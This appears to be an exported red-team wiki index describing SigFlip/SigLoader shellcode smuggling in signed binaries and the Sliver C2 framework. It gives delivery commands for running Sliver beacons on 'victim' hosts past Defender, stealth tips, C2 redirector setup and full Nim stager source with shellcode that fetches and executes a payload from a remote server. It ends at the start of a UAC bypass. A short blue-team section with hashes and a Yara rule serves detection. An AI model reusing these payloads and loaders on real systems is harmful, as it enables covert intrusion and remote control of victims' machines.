Windows machine vcruntime140d.dll DLL required by SigLoader.exe Transfer to victim machine with SigLoader ucrtbased.dll DLL required by SigLoader Transfer to victim machine with SigLoader ucrtbase.dll DLL required by SigLoader Transfer to victim machine with SigLoader Technical information For this attack, two separate executables are used. SigFlip is a tool to embed shellcode into a digitally signed binary. Before embedding the shellcode into PE file's WIN_CERTIFICATE certificate table , the shellcode is encrypted with a password provided by the user (symmetric encryption). The shellcode is separately generated in a raw binary format (for example using -f raw in Metasploit, -f shellcode for Sliver and so on). This creates a new signed binary with the embedded encrypted shellcode and a valid digital signature. SigLoader is used in the victim system to find the encrypted shellcode from the specified binary, to be decrypted with a given password, loaded into memory and executed. The loader executable utilizes an egg-hunt style mechanic to find the shellcode's position by looking for a hex value 0xfeedface . Once the shellcode is found it is decrypted and loaded into memory and executed. Embedding shellcode to a signed binary A digitally signed binary ChromeSetup.exe was used for testing purposes. As shellcode, a Sliver beacon payload was used. The following syntax is used to encrypt a shellcode and embed it into a binary: SigFlip.exe -i <ORIG_EXE> -s <SHCODE.BIN> -o <OUTFILE.EXE> -e <PASSWORD> SigFlip.exe -i .\\ChromeSetup.exe -s .\\beacon.bin -o mod_chrome.exe -e password Executing the loader and shellcode on the victim machine Deliver the loader files (SigLoader.exe + 3 DLLs) along with the mod_chrome.exe to the victim machine. To execute the encrypted shellcode inside mod_chrome.exe , run the following command on the target system: SigLoader.exe mod_chrome.exe password In the example below, SigLoader was used to execute a Sliver beacon shellcode on Windows 10 with Defender up-to-date and active (11th May, 2023): The following screenshot shows Sliver server catching the callback from agent. Improvement ideas General ideas for making the execution more stealthy: Run the command with Run as a hidden process Modify the source code to make SigLoader not print such suspicious texts Deliver","title":"SigFlip / SigLoader"},{"location":"5-local-privilege-escalation/sigflip/sigflip-OLD/#sigflip-sigloader","text":"","title":"SigFlip / SigLoader"},{"location":"5-local-privilege-escalation/sigflip/sigflip-OLD/#background","text":"These tools are used for embedding custom shellcode into a signed binary. The binary is executed in a victim system using SigLoader.exe . A Windows machine is required for using this toolkit. Since the (malicious) shellcode is encrypted, this method is highly effective at smuggling shellcode into the victim host past any defensive measures. Link to the original Git repository. Two executables and three libraries have been already compiled using VS Studio. The ready-to-use toolbox includes five files listed in the table below. File Function Purpose SigFlip.exe Shellcode encrypter & injector Execute in attacker's Windows machine SigLoader.exe Shellcode decrypter & loader Execute in victim's Windows machine vcruntime140d.dll DLL required by SigLoader.exe Transfer to victim machine with SigLoader ucrtbased.dll DLL required by SigLoader Transfer to victim machine with SigLoader ucrtbase.dll DLL required by SigLoader Transfer to victim machine with SigLoader","title":"Background"},{"location":"5-local-privilege-escalation/sigflip/sigflip-OLD/#technical-information","text":"For this attack, two separate executables are used. SigFlip is a tool to embed shellcode into a digitally signed binary. Before embedding the shellcode into PE file's WIN_CERTIFICATE certificate table , the shellcode is encrypted with a password provided by the user (symmetric encryption). The shellcode is separately generated in a raw binary format (for example using -f raw in Metasploit, -f shellcode for Sliver and so on). This creates a new signed binary with the embedded encrypted shellcode and a valid digital signature. SigLoader is used in the victim system to find the encrypted shellcode from the specified binary, to be decrypted with a given password, loaded into memory and executed. The loader executable utilizes an egg-hunt style mechanic to find the shellcode's position by looking for a hex value 0xfeedface . Once the shellcode is found it is decrypted and loaded into memory and executed.","title":"Technical information"},{"location":"5-local-privilege-escalation/sigflip/sigflip-OLD/#embedding-shellcode-to-a-signed-binary","text":"A digitally signed binary ChromeSetup.exe was used for testing purposes. As shellcode, a Sliver beacon payload was used. The following syntax is used to encrypt a shellcode and embed it into a binary: SigFlip.exe -i <ORIG_EXE> -s <SHCODE.BIN> -o <OUTFILE.EXE> -e <PASSWORD> SigFlip.exe -i .\\ChromeSetup.exe -s .\\beacon.bin -o mod_chrome.exe -e password","title":"Embedding shellcode to a signed binary"},{"location":"5-local-privilege-escalation/sigflip/sigflip-OLD/#executing-the-loader-and-shellcode-on-the-victim-machine","text":"Deliver the loader files (SigLoader.exe + 3 DLLs) along with the mod_chrome.exe to the victim machine. To execute the encrypted shellcode inside mod_chrome.exe , run the following command on the target system: SigLoader.exe mod_chrome.exe password In the example below, SigLoader was used to execute a Sliver beacon shellcode on Windows 10 with Defender up-to-date and active (11th May, 2023): The following screenshot shows Sliver server catching the callback from agent.","title":"Executing the loader and shellcode on the victim machine"},{"location":"5-local-privilege-escalation/sigflip/sigflip-OLD/#improvement-ideas","text":"General ideas for making the execution more stealthy: Run the command with Run as a hidden process Modify the source code to make SigLoader not print such suspicious texts Deliver","title":"Improvement ideas"},{"location":"5-local-privilege-escalation/sigflip/sigflip/","text":"SigFlip & SigLoader Background These tools are used for embedding custom shellcode into a signed binary, and executing it in a victim system using SigLoader.exe . Note, that a Windows machine is required for using this toolkit. Since the (malicious) shellcode is encrypted, this method is quite certain to succeed in smuggling the shellcode to the victim host past any defensive measures. Link to the original Git repository: For your convenience, 2 executables and 3 libraries have been already compiled using VS Studio. The ready-to-use toolbox includes 5 files listed in the table below. File Function Purpose SigFlip.exe Shellcode encrypter & injector Execute in attacker's Windows machine SigLoader.exe Shellcode decrypter & loader Execute in victim's Windows machine vcruntime140d.dll DLL required by SigLoader.exe Transfer to victim machine with SigLoader ucrtbased.dll DLL required by SigLoader Transfer to victim machine with SigLoader ucrtbase.dll DLL required by SigLoader Transfer to victim machine with SigLoader The figure below illustrates the concept. Actions on the upper half are carried out on the attacking machine. Actions on the lower half of the figure are carried out on the target machine. About SigFlip and SigLoader Two separate executables are used. SigFlip SigFlip is a tool to embed shellcode into a digitally signed binary. Before embedding the shellcode to PE file's WIN_CERTIFICATE certificate table , the shellcode is encrypted with a password provided by the user (symmetric encryption). The shellcode has to be separately generated in a raw binary format (as example, -f raw in Metasploit, -f shellcode for Sliver and so on). This creates a new signed binary, which has the encrypted shellcode embedded into and a valid digital signature. SigLoader SigLoader is used in the victim system, to find the encrypted shellcode from the specified binary, decrypt it with a given password, load it into memory and execute it. Loader executable utilizes an egg-hunt style mechanic to find the shellcode's position by looking for a hex value 0xfeedface . Once the shellcode is found, it is decrypted and loaded into memory, followed by execution. Embedding shellcode to a signed binary For testing purposes, a digitally signed binary ChromeSetup.exe is used. As shellcode, a Sliver beacon payload is used. To encrypt a shellcode and embed it into a binary, following syntax is used: SigFlip.exe -i <ORIG_EXE> -s <SHCODE.BIN> -o <OUTFILE.EXE> -e <PASSWORD> SigFlip.exe -i .\\ChromeSetup.exe -s .\\beacon.bin -o mod_chrome.exe -e password Executing the loader & shellcode on victim host Deliver the loader files (SigLoader.exe + 3 DLLs) along with the mod_chrome.exe to the victim machine. To execute the encrypted shellcode inside the mod_chrome.exe , run the following command on the target system: SigLoader.exe mod_chrome.exe password Below is a screenshot, where SigLoader was used to execute a Sliver beacon shellcode on Windows 10 with Defender up-to-date and active (11th May, 2023). The following screenshot shows Sliver server catching the callback from agent. Improvement ideas General ideas for making the execution more stealthy: Run the command with Run as a hidden process Modify the source code to make SigLoader not print so suspicious texts Deliver For blue teams There are two kinds of traces left by SigLoader. The tool leaves static and dynamic traces to the victim machine. The following table below shows static traces related to the tool either directly or indirectly. Static traces Detecting SigLoader The following traces are related to the SigLoader binary. Every file listed below is not a certain indicator of compromise. Trace / type Trace location Hash Presence indicator Additional info SigLoader.exe / file Victim host md5: de452f0e70df61a3895bbb35245f0ff3 , sha1: 56cc0dfaf84a49828343800bf3fb11948b64d0f5 100% - vcruntime140d.dll / file Victim host md5: d3a035156204a412e8e69d7f8bcdc838 , sha1: d5a77b1c62822d47b4bee8db1e84ddc1b3666c15 <1% Present also when VS Studio or another compiling tool is installed ucrtbase.dll / file Victim host md5: 2c8fe06966d5085a595ffa3c98fe3098 , sha1: e82945e3e63ffef0974d6dd74f2aef2bf6d0a908 <1% Usually installed to Windows by default(at least Win10), Info ucrtbased.dll / file Victim host md5: 108b715a604d800501462fb648b82a75 sha1: c9bec97e6033f60113581c76a97f5fc89f37520a <1% Present also when VS Studio or another such tool is installed SigLoader binary - strings When hunting SigLoader executable, strings of the suspicious executable may provide a strong indicator of the binary being SigLoader. As example, the following string can be found from the SigLoader binary provided in the toolbox: C:\\Users\\user\\Desktop\\SigFlip-main\\Native\\SigLoader\\x64\\Debug\\SigLoader.pdb The string above provides two hunting ideas: Look for strings sigflip and sigloader (case insensitive) in the binary. If either one of these is present, the binary very likely is SigLoader. Detecting the smuggling binary Since SigLoader is used for extracting and executing shellcode from a signed binary's certificate table, the signed binary can also be used as a possible indicator of compromise. However, the checksum or size of the signed binary can not be used to determine wether or not this binary is the \"smuggling binary\" (signed binary which has shellcode embedded into it). Size of the \"smuggling binary\" depends heavily on the shellcode's size, and it's checksum practically is different in every case. SigLoader searches the encrypted shellcode from a certificate table by looking for an entry of two sequential 0xfeedface bytes. This provides a vector for detection: Trace / type Trace location Found in Presence Indicator Additional info two sequential 0xfeedface bytes / bytes Victim host A signed binary's certificate table >90% The \"egg\" hunted by the SigLoader, feed face feed face The following example Yara rule can be used to search for this \"egg\": rule SigLoaderEgg { strings: $hex_feedface = {FE ED FA CE FE ED FA CE} condition: $hex_feedface }","title":"SigLoader"},{"location":"5-local-privilege-escalation/sigflip/sigflip/#sigflip-sigloader","text":"","title":"SigFlip &amp; SigLoader"},{"location":"5-local-privilege-escalation/sigflip/sigflip/#background","text":"These tools are used for embedding custom shellcode into a signed binary, and executing it in a victim system using SigLoader.exe . Note, that a Windows machine is required for using this toolkit. Since the (malicious) shellcode is encrypted, this method is quite certain to succeed in smuggling the shellcode to the victim host past any defensive measures. Link to the original Git repository: For your convenience, 2 executables and 3 libraries have been already compiled using VS Studio. The ready-to-use toolbox includes 5 files listed in the table below. File Function Purpose SigFlip.exe Shellcode encrypter & injector Execute in attacker's Windows machine SigLoader.exe Shellcode decrypter & loader Execute in victim's Windows machine vcruntime140d.dll DLL required by SigLoader.exe Transfer to victim machine with SigLoader ucrtbased.dll DLL required by SigLoader Transfer to victim machine with SigLoader ucrtbase.dll DLL required by SigLoader Transfer to victim machine with SigLoader The figure below illustrates the concept. Actions on the upper half are carried out on the attacking machine. Actions on the lower half of the figure are carried out on the target machine.","title":"Background"},{"location":"5-local-privilege-escalation/sigflip/sigflip/#about-sigflip-and-sigloader","text":"Two separate executables are used.","title":"About SigFlip and SigLoader"},{"location":"5-local-privilege-escalation/sigflip/sigflip/#sigflip","text":"SigFlip is a tool to embed shellcode into a digitally signed binary. Before embedding the shellcode to PE file's WIN_CERTIFICATE certificate table , the shellcode is encrypted with a password provided by the user (symmetric encryption). The shellcode has to be separately generated in a raw binary format (as example, -f raw in Metasploit, -f shellcode for Sliver and so on). This creates a new signed binary, which has the encrypted shellcode embedded into and a valid digital signature.","title":"SigFlip"},{"location":"5-local-privilege-escalation/sigflip/sigflip/#sigloader","text":"SigLoader is used in the victim system, to find the encrypted shellcode from the specified binary, decrypt it with a given password, load it into memory and execute it. Loader executable utilizes an egg-hunt style mechanic to find the shellcode's position by looking for a hex value 0xfeedface . Once the shellcode is found, it is decrypted and loaded into memory, followed by execution.","title":"SigLoader"},{"location":"5-local-privilege-escalation/sigflip/sigflip/#embedding-shellcode-to-a-signed-binary","text":"For testing purposes, a digitally signed binary ChromeSetup.exe is used. As shellcode, a Sliver beacon payload is used. To encrypt a shellcode and embed it into a binary, following syntax is used: SigFlip.exe -i <ORIG_EXE> -s <SHCODE.BIN> -o <OUTFILE.EXE> -e <PASSWORD> SigFlip.exe -i .\\ChromeSetup.exe -s .\\beacon.bin -o mod_chrome.exe -e password","title":"Embedding shellcode to a signed binary"},{"location":"5-local-privilege-escalation/sigflip/sigflip/#executing-the-loader-shellcode-on-victim-host","text":"Deliver the loader files (SigLoader.exe + 3 DLLs) along with the mod_chrome.exe to the victim machine. To execute the encrypted shellcode inside the mod_chrome.exe , run the following command on the target system: SigLoader.exe mod_chrome.exe password Below is a screenshot, where SigLoader was used to execute a Sliver beacon shellcode on Windows 10 with Defender up-to-date and active (11th May, 2023). The following screenshot shows Sliver server catching the callback from agent.","title":"Executing the loader &amp; shellcode on victim host"},{"location":"5-local-privilege-escalation/sigflip/sigflip/#improvement-ideas","text":"General ideas for making the execution more stealthy: Run the command with Run as a hidden process Modify the source code to make SigLoader not print so suspicious texts Deliver","title":"Improvement ideas"},{"location":"5-local-privilege-escalation/sigflip/sigflip/#for-blue-teams","text":"There are two kinds of traces left by SigLoader. The tool leaves static and dynamic traces to the victim machine. The following table below shows static traces related to the tool either directly or indirectly.","title":"For blue teams"},{"location":"5-local-privilege-escalation/sigflip/sigflip/#static-traces","text":"","title":"Static traces"},{"location":"5-local-privilege-escalation/sigflip/sigflip/#detecting-sigloader","text":"The following traces are related to the SigLoader binary. Every file listed below is not a certain indicator of compromise. Trace / type Trace location Hash Presence indicator Additional info SigLoader.exe / file Victim host md5: de452f0e70df61a3895bbb35245f0ff3 , sha1: 56cc0dfaf84a49828343800bf3fb11948b64d0f5 100% - vcruntime140d.dll / file Victim host md5: d3a035156204a412e8e69d7f8bcdc838 , sha1: d5a77b1c62822d47b4bee8db1e84ddc1b3666c15 <1% Present also when VS Studio or another compiling tool is installed ucrtbase.dll / file Victim host md5: 2c8fe06966d5085a595ffa3c98fe3098 , sha1: e82945e3e63ffef0974d6dd74f2aef2bf6d0a908 <1% Usually installed to Windows by default(at least Win10), Info ucrtbased.dll / file Victim host md5: 108b715a604d800501462fb648b82a75 sha1: c9bec97e6033f60113581c76a97f5fc89f37520a <1% Present also when VS Studio or another such tool is installed","title":"Detecting SigLoader"},{"location":"5-local-privilege-escalation/sigflip/sigflip/#sigloader-binary-strings","text":"When hunting SigLoader executable, strings of the suspicious executable may provide a strong indicator of the binary being SigLoader. As example, the following string can be found from the SigLoader binary provided in the toolbox: C:\\Users\\user\\Desktop\\SigFlip-main\\Native\\SigLoader\\x64\\Debug\\SigLoader.pdb The string above provides two hunting ideas: Look for strings sigflip and sigloader (case insensitive) in the binary. If either one of these is present, the binary very likely is SigLoader.","title":"SigLoader binary - strings"},{"location":"5-local-privilege-escalation/sigflip/sigflip/#detecting-the-smuggling-binary","text":"Since SigLoader is used for extracting and executing shellcode from a signed binary's certificate table, the signed binary can also be used as a possible indicator of compromise. However, the checksum or size of the signed binary can not be used to determine wether or not this binary is the \"smuggling binary\" (signed binary which has shellcode embedded into it). Size of the \"smuggling binary\" depends heavily on the shellcode's size, and it's checksum practically is different in every case. SigLoader searches the encrypted shellcode from a certificate table by looking for an entry of two sequential 0xfeedface bytes. This provides a vector for detection: Trace / type Trace location Found in Presence Indicator Additional info two sequential 0xfeedface bytes / bytes Victim host A signed binary's certificate table >90% The \"egg\" hunted by the SigLoader, feed face feed face The following example Yara rule can be used to search for this \"egg\": rule SigLoaderEgg { strings: $hex_feedface = {FE ED FA CE FE ED FA CE} condition: $hex_feedface }","title":"Detecting the smuggling binary"},{"location":"5-local-privilege-escalation/sliver/sliver/","text":"Sliver Background Sliver is an open-source adversary emulation/red team framework and is an alternative to Cobalt Strike. The tool can be utilized by organizations of any scale for conducting post-exploitation security testing. Sliver's implants have built-in support for communication channels such as mutual TLS (mTLS), WireGuard, HTTP(S), and DNS. They are compiled on the fly using unique encryption keys for each binary. Server and client components of Sliver are compatible with MacOS, Windows, and Linux operating systems. They also function with other Golang compiler targets, although testing is in this case not comprehensive. The tool is undetected in the FireEye EDR. Features The tool includes a wide range of features. A notable feature is the 'multipayer' mode, which allows multiple operators to connect to the same server beacon. This is especially useful in large-scale red-teaming environments where coordination is necessary. Operators and server connections are authenticated using mTLS. Certificates are managed automaticaly by Sliver. It is fully scriptable with Java/Typescript. See the Sliver Github for a more detailed breakdown. Installation The installation process is straightforward. The most reliable method is to download the latest server and client binaries from the Sliver release page. Begin by changing user rights with chmod +x sliver* and run the server file by entering the following: ./sliver-server Server and client setup Set up a server in the /tmp directory with the command python3 -m http.server 8000 . Create a new operator profile. ./sliver-server_linux operator --name [OPERATOR] --lhost [IP ADDRESS] --save [OPERATOR].cfg This feature is useful because it allows multiple operators to connect to the same server. The .cfg file is placed in /root by default. Import the profile into relevant folder using the ./sliver-client_linux import [OPERATOR].cfg command. Additional operators are created on the server. Profiles can be exported to the player with SCP. The command scp [OPERATOR].cfg kali@[ADDRESS]: is used. Operators import the profile using the command import [OPERATOR].cfg . Enable Multiplayer mode on the server with the command multiplayer . Operators can be viewed by entering the operator command. Operators enter enter the game when they run the client server. Beacon setup Generate beacons on the Sliver server with the following command: generate beacon --mtls [IP ADDRESS] --save /tmp/[BEACON NAME] --skip-symbols -f exe --os windows Implant the beacon on the target machine. The most convenent implantation method is to set up a browser-accessible server. As before, this can be done in the /tmp directory with the command python3 -m http.server [PORT NUMBER] . Port 8080 was used in this example. For Windows-based targets it is recommended to use the .exe extension when naming the beacon. Save and run the beacon file from the local drive. Initialise an mTLS session on the server. Addtional arguments were used in the example below, but the session will also start simply by using the mtls command. The implant beacon will appear in the session once the beacon file on the target machine has been executed locally (i.e., double-clicked). Implants are viewable with the implants command. The command interactive can be used to select the current C2 channel. Alternativey, the command use can be deployed to select the session from a list. Once the session is selected it is possible to navigate the target machine's file system. The session will persist until the beacon is removed. It is accessible via both the server and the client. The help keyword displays the possible range of commands. Usage 1. Modules Sliver modules offer a wide range of attack vectors and can be accessed with the armory command. Armory modules can be installed with the armory install [MODULE NAME] command. Usage instructions can be accessed with the [MODULE NAME] -h command. 2 Advanced Usage 2.1 Traffic redirection Command and control (C2) infrastructure is used to communicate with compromised systems and maintain control over them. C2 traffic redirection enables attackers to control C2 traffic within the target environment. Traffic redirectors help attackers evade detection and bypass security controls designed to detect or block malicious C2 traffic. They enable attackers to obfuscate their activities and make it harder for security systems to identify and block their actions. Setting up a traffic redirector in Silver requires the installation of a dedicated server. This can be done with Apache or NGINX, but the process is simplest in Caddy. Caddy Installation On Debian-based systems Caddy can be installed with the following commands: sudo apt install -y debian-keyring debian-archive-keyring apt-transport-https curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/gpg.key' | sudo gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt' | sudo tee /etc/apt/sources.list.d/caddy-stable.list sudo apt update sudo apt install caddy Server setup Caddy configuration is handled by the Caddyfile located in /etc/caddy . The file requires only two modifications. The topmost domain is the site targeted for redirection. The domain following the redir command is the destination URL and port to where requests will be redirected. The {uri} placeholder preserves the original path and query parameters in the redirect. mTLS requests in Sliver are sent over port 8888. The redirect port should be set to this number when using Sliver's mTLS listener. The port number for the target domain should be unique. The caddy server is started by issuing the caddy start command. The standard Sliver beacon setup procedure can be used once the Caddy server is up and running: Generate beacon: generate beacon --mtls 198.18.103.67 --save /tmp/caddy_beacon.exe --skip-symbols -f exe --os windows Start mTLS listener: mtls Set up a server accessible on the target machine: python3 -m http.server [UNIQUE PORT NUMBER] Navigate to the server page in the bowser on the target machine. In this example, the page is located at 198.18.107.63:8081 . Implant the beacon on the target machine by downloading and executing the file generated in step 1. The beacon is displayed in the Sliver UI after the beacon file has been executed. Select beacon with the command use . The session can be upgraded with the interactive command. The command beacons displays the available beacons. Active beacons are displayed in green. The reverse proxy is set up correctly if the beacon calls back to the back to the server at given intervals. Inactive beacons are displayed in red. In Nestat: 2.2 Staging Sliver payloads can be large. As such, a stager can be used to execute an implant on a target. A stager is a small program or script that fetches the main payload from a remote location. While size doesn't matter as much in computing world anymore, hiding a full-sized implant can be difficult in certain circumstances. Sliver can generate stagers or a custom one can be used. The following is needed to set up a stager in Sliver: A staging server (Your sliver server) A stage 2 payload (the main sliver payload, typically in shellcode) The stager (Can be generated with the generate stager command or custom-made) Stager setup Sliver staging uses the profiles feature. Profiles work as implant blueprints that define configuration information. Profiles can be created with profiles new command. In this example, we will serve an mTLS implant. sliver > profiles new --mtls 198.18.103.68 --format shellcode win-shellcode [*] Saved new implant profile win-shellcode sliver > profiles Profile Name Implant Type Platform Command & Control Debug Format Obfuscation Limitations =============== ============== =============== =============================== ======= =========== ============= ============= win-shellcode session windows/amd64 [1] mtls://198.18.103.68:8888 false SHELLCODE enabled sliver > With the profile setup, a listener for the mTLS implant is required. sliver > mtls [*] Starting mTLS listener ... [*] Successfully started job #1 sliver > jobs ID Name Protocol Port ==== ====== ========== ====== 1 mtls tcp 8888 A staging listener can then be created with the stage-listener command and linked to a new profile: sliver > stage-listener --url http://198.18.103.68:80 --profile win-shellcode [*] No builds found for profile win-shellcode, generating a new one [*] Job 1 (tcp) started sliver > jobs ID Name Protocol Port == ==== ======== ==== 1 http tcp 80 2 mtls tcp 8888 Now we're ready to create our stager. This can be done with the generate stager command. A local host and port should be specified to know where the stage listener is. sliver > generate stager --lhost 198.18.103.68 --lport 80 --protocol http --save /tmp [*] Sliver stager saved to: /tmp/NEAT_SNOWPLOW If this results in an RPC error it is likely that Sliver's payload generator is out of date. The error can be resolved by updating Kali with the commands sudo apt update , followed by sudo apt upgrade . With the stager generated, we can take a look at the results: \u250c\u2500\u2500(kali\u327fkali-vle)-[~] \u2514\u2500$ cat /tmp/NEAT_SNOWPLOW unsigned char buf[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\" \"\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\" ... \"\\xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5\" Sliver as of now won't generate anything that can just be double-clicked. Something to run shellcode needs to be built. This can be accomplished in a near infinite amount of ways. One method is demonstrated below. Creating the stager Nim can be used to create the stager. Nim is a statically typed compiled programming language that resembles Python and compiles to C, C++ and even JavaScript. This method uses Nim's Winim library that allows easy access Windows API definitions. It can be installed it with the command nimble install winim import winim/lean when defined(windows): var shellcode: array[511, byte] = [ byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52 ,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52 ,0x20,0x51,0x56,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9 ,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41 ,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48 ,0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b ,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x8b,0x48 ,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0x50,0xe3,0x56,0x48,0xff,0xc9,0x41 ,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0x41,0xc1,0xc9 ,0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45 ,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b ,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58 ,0x48,0x01,0xd0,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48 ,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9 ,0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00 ,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5 ,0x49,0xbc,0x02,0x00,0x1e,0x61,0xc6,0x12,0x67,0x44,0x41,0x54,0x49,0x89,0xe4 ,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68 ,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a ,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89 ,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5 ,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba ,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,0x75,0xe5 ,0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9 ,0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5 ,0x83,0xf8,0x00,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41 ,0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41 ,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31 ,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8 ,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40 ,0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,0xff,0xd5 ,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c ,0xff,0xff,0xff,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41 ,0xff,0xe7,0x58,0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff ,0xd5 ] # Equilevant to Python's if __name__ == \"__main__\" when isMainModule: let currentproc = GetCurrentProcessId() echo \"Current process ID: \", currentproc # Allocate memory for our shellcode let memPtr = VirtualAlloc( nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE ) # Copy our shellcode to the memory section CopyMemory(memPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len)) # Interesting way to execute our code, ref: https://github.com/HuskyHacks/RustyProcessInjectors/blob/master/EnumSystemGeoID/src/main.rs EnumSystemGeoID( 16, 0, cast[GEO_ENUMPROC](memPtr) ) Compiling this program can be done on Linux if you have MinGW . The command to compile it to Windows is nim c --cpu:amd64 --os:windows --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc -d:release <your stager>.nim Running this binary on the target Windows machine results in the binary fetching the main Sliver payload from our server and executing it, giving us a session: Confirming the stager fetched the main payload can be done by viewing sliver.log file: Custom stager creation Since the effort was made to create a binary to run the generated stager, why not go all the way and create a custom stager? This is easier than it sounds. Sliver has documentation on how to make your own stager on their Github page. All we have to do is to fetch the payload being served on the Sliver server through the stage-listener . Viewing the Sliver C2 documentation , we see the Sliver serves the main payloads on the HTTP protocol when requesting any file with the .woff file extension. This can be tested by using something like wget on the sliver server and requesting a file such as googlewebfront.woff \u250c\u2500\u2500(kali\u327fkali-vle)-[~/nim/malzDev/Sliver-stage-0] \u2514\u2500$ wget localhost:80/googlewebfront.woff \u250c\u2500\u2500(kali\u327fkali-vle)-[~/nim/malzDev/Sliver-stage-0] \u2514\u2500$ cat googlewebfront.woff| xxd | head -n 3 00000000: 3879 2f42 3f45 2847 2b4b 6250 6553 6841 8y/B?E(G+KbPeShA 00000010: 848d 2a78 ce77 153b eaff aca8 d27a 0e69 ..*x.w.;.....z.i 00000020: 2887 67c6 f0f0 f8d8 477d 8639 e58e 1d0c (.g.....G}.9.... The stage listener returned the shellcode in the HTTP response. Now a simple client can be created that fetches the shellcode over HTTP(S) and executes it in memory: import std/httpclient import winim/lean import sequtils when defined(windows): proc main(): void = let currentproc = GetCurrentProcessId() echo \"[*] Current process ID: \", currentproc var client = newHttpClient() var response = client.getContent(\"http://198.18.103.68/googlewebfront.woff\") # Convert the downloaded implant from string to array var bytes = response.toSeq() # Allocate memory let memPtr = VirtualAlloc( nil, cast[SIZE_T](bytes.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE ) # Copy our shellcode to the memory section echo \"[*] Copying shellcode to memory...\" CopyMemory(memPtr, addr(bytes[0]), cast[SIZE_T](bytes.len)) echo \"[*] Executing shellcode...\" # Interesting way to exec our code, ref: https://github.com/HuskyHacks/RustyProcessInjectors/blob/master/EnumSystemGeoID/src/main.rs EnumSystemGeoID( 16, 0, cast[GEO_ENUMPROC](memPtr) ) when isMainModule: main() Compiling this program and running it on a Windows target results in us getting the shell: 2.3 Privilege escalation It is possible to create system sessions in Sliver. On Windows machines it is necessary to bypass User Account Control (UAC) before a remote system session can be initialised. A relatively straightforward way to achieve this is with a reflective DLL injection. On the target machine do the following: Create a script called Sources.cs with the code below. Save it to a convenient location. /* UAC Bypass using CMSTP.exe microsoft binary Based on previous work from Oddvar Moe https://oddvar.moe/2017/08/15/research-on-cmstp-exe/ And this PowerShell script of Tyler Applebaum 